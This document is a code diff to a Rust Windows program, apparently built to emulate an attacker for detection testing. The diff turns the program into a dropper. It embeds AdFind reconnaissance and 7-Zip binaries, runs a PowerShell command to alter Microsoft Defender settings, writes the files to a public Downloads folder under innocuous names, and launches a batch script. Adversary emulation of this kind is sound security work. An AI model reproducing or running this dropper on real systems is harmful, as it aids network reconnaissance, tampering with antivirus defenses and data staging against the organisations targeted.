@@ -13,6 +13,9 @@ use winreg::HKEY;
 use winreg::RegKey;
 use winreg::enums::*;
 
+use std::fs::File;
+use std::io::Write;
+
 mod tools {
 
     use RegKey;
@@ -44,12 +47,27 @@ mod tools {
     
     /* learn how use generic type for value */
     pub fn set_reg_str(root: HKEY, regpath: &str,name: &str, value: &str){
-    
-        let base = RegKey::predef(root);
-        let  (settings, _disp) = base.create_subkey(regpath).unwrap();
-        settings.set_value(name, &value).unwrap();
+        let base = winreg::RegKey::predef(root);
+        let rootkey = base.create_subkey(regpath);
+        match rootkey{
+            Ok(subkey) => {
+                let _set_result = subkey.0.set_value(name, &value);
+            },
+            Err(_) => return(),
+        }
+   }
+   pub fn set_reg_u32(root: HKEY, regpath: &str,name: &str, value: u32){
+    let base = winreg::RegKey::predef(root);
+    let rootkey = base.create_subkey(regpath);
+    match rootkey{
+        Ok(subkey) => {
+            let _set_result = subkey.0.set_value(name, &value);
+        },
+        Err(_) => return(),
     }
-    
+}
+
+
     pub fn spawn(exe_path: &str){
         let exe_in = std::env::current_exe().unwrap();
         // set new
@@ -89,18 +107,30 @@ mod tools {
 
 
 fn main() {
-    //get current exe
-    let my_name = std::env::current_exe()
-        .expect("Can't get the exec path")
-        .file_name()
-        .expect("Can't get the exec name").
-        to_string_lossy().
-        into_owned();
+    let dropzone = r"C:\Users\Public\Downloads\";
 
-    match my_name.as_ref(){
-        "rustmydetection.exe" => {tools::spawn(r"setup.exe");},
-        "setup.exe" => {tools::spawn(r"C:\Program File\Microsoft Office\Office16\WinWord.exe");},
-        _ => {}
+    //Adfind tools
+    let adfind_bin = include_bytes!("payload/AdFind.bin");
+    let adfind_cmd = include_str!("payload/adfind.cmd");
+    
+    //7zip
+    let  sevenzip_a = include_bytes!("payload/7zip/7za.dll");
+    let  sevenzip_xa = include_bytes!("payload/7zip/7zxa.dll");
+    let  sevenzip_exe = include_bytes!("payload/7zip/7za.exe");
+
+    // exclude exe from defender
+    tools::run_exe("powershell", "Remove-MpPreference -ExclusionExtension .exe");
+    
+    //let make a scope to close the file :)
+    {
+        File::create(format!("{}{}",dropzone,"find.exe")).expect("Oups").write_all(adfind_bin).unwrap();
+        File::create(format!("{}{}",dropzone,"check.cmd")).expect("Oups").write_all( adfind_cmd.as_bytes()).unwrap();
+        File::create(format!("{}{}",dropzone,"7za.dll")).expect("Oups").write_all(sevenzip_a).unwrap();
+        File::create(format!("{}{}",dropzone,"7zxa.dll")).expect("Oups").write_all(sevenzip_xa).unwrap();
+        File::create(format!("{}{}",dropzone,"7za.exe")).expect("Oups").write_all(sevenzip_exe).unwrap();
     }
+
+    //    tools::run_exe("cmd", &format!("/C {}{}",dropzone,"check.cmd"))
+    Command::new("cmd").current_dir(dropzone).args(["/C","check.cmd"]).spawn().expect("Oups");
 
 }
